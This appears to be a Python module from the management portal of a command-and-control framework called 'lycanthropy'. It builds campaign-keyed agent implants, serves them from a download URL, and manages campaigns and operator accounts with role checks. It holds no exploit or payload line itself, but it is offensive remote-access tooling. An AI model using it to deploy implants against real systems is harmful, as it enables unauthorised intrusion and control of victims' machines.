import base64
import os
import lycanthropy.portal.api
import lycanthropy.portal.campaigns
import lycanthropy.auth.client
import lycanthropy.sql.interface
import lycanthropy.sql.server
import lycanthropy.crypto
import lycanthropy.dist.builder
import json
import time
import random
import threading

#https://127.0.0.1:56114/5/0/MzZVM3VnUnZyUQ==/SlJQbThTYnI=


def buildRun(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('build.run', context, arguments)
    buildResults = {}
    campaignConfig = json.load(
        open(
            'campaign/{}/config.json'.format(arguments['campaign']),
            'r'
        )
    )
    campaignBuilder = campaignConfig['buildID']
    buildIdentity = base64.b64encode(campaignBuilder.encode('utf-8')).decode('utf-8')
    rawKey = random.choice(campaignConfig['keys'])
    buildKey = base64.b64encode(rawKey.encode('utf-8')).decode('utf-8')
    if int(arguments['batch']) > 10:
        return {'output':{'error':'maximum build limit exceeded'}, 'context': 'manage(build.run)', 'form': restoredForm}
    for build in range(1,int(arguments['batch'])+1):
        buildThread = threading.Thread(target=lycanthropy.dist.builder.buildAgent,args=(rawKey,campaignBuilder,))
        buildThread.run()
    #lycanthropy.dist.builder.buildAgent(decodedKey, decodedID)
    retrievalUrl = 'https://{}:{}/5/0/{}/{}/lycanthropy.jar?buildID=null'.format(
        connector['interface'],
        connector['port'],
        buildIdentity,
        buildKey
    )
    return {'output': {'status':'created {} builds, which can be found at {} (builds will be discarded after download)'.format(arguments['batch'],retrievalUrl)}, 'context': 'manage(build.run)', 'form': restoredForm}


def addCampaign(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('add.campaign', context, arguments)
    # pkgcore
    # default build settings
    # directories
    # config
    # access
    # name
    #cmdContext = context.split('(')[0]
    #when you check defaults use addCampaign
    apiUser = connector['apiToken']['user']
    userData = lycanthropy.sql.interface.filterUser({'username': apiUser})[0]
    if 'manager' not in userData['roles'].split(','):
        return {'output':{'error':'you do not have the correct role to run this command'}, 'context': 'manage(add.campaign)', 'form': restoredForm}
    campaignStatus = lycanthropy.portal.campaigns.mkCampaign(arguments,context)
    return {'output':campaignStatus, 'context': 'manage(add.campaign)', 'form': restoredForm}


def addUser(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('add.user', context, arguments)
    if not lycanthropy.portal.api.accessChk(connector,'manager'):
        return {'output': {'error': 'you do not have the correct role to run this command'}, 'context': 'manage(add.user)', 'form': restoredForm}
    password = lycanthropy.crypto.mkRandom(14)
    userAdd = lycanthropy.sql.server.storeUser(
        arguments['username'],
        lycanthropy.auth.client.mkUser(arguments['username'],password),
        arguments['campaigns'],
        arguments['roles']
    )
    if 'error' in userAdd:
        return {'output':userAdd, 'context': 'manage(add.user)', 'form': restoredForm}
    return {'output':{
        'warning':'the server does not store the plaintext password, and it cannot be recovered after this point',
        'username':arguments['username'],
        'password':password,
        'campaigns':arguments['campaigns'].split(','),
        'roles':arguments['roles'].split(',')
        },
        'context':'manage(add.user)',
        'form':arguments
    }


def delCampaign(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('del.campaign', context, arguments)
    if not lycanthropy.portal.api.accessChk(connector,'manager'):
        return {'output': {'error': 'you do not have the correct role to run this command'}, 'context': 'manage(del.campaign)', 'form': restoredForm}
    campaignStatus = lycanthropy.portal.campaigns.rmCampaign(arguments,context)
    return {'output': campaignStatus, 'context': 'manage(del.campaign)', 'form': restoredForm}

def delUser(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('del.user', context, arguments)
    if not lycanthropy.portal.api.accessChk(connector,'manager'):
        return {'output': {'error': 'you do not have the correct role to run this command'}, 'context': 'manage(del.user)', 'form': restoredForm}
    userDel = lycanthropy.sql.server.rmUser(arguments['username'])
    if 'error' in userDel:
        return {'output':userDel, 'context':'manage(del.user)','form':restoredForm}

def listCampaigns(arguments,context,connector):
    restoredForm = lycanthropy.portal.api.restoreForm('list.campaigns', context, arguments)
    apiUser = connector['apiToken']['user']
    userData = lycanthropy.sql.interface.filterUser({'username': apiUser})[0]
    if 'manager' in userData['roles'].split(','):
        accessibleCampaigns = os.listdir('campaign')
        return {'output': {'campaigns':accessibleCampaigns},
                'context': 'manage(list.campaigns)', 'form': restoredForm}
    else:
        accessibleCampaigns = []
        for campaignName in os.listdir('campaign'):
            if campaignName in userData['campaigns'].split(','):
                accessibleCampaigns.append(campaignName)
        return {'output': {'campaigns':accessibleCampaigns},
                'context': 'manage(list.campaigns)', 'form': restoredForm}
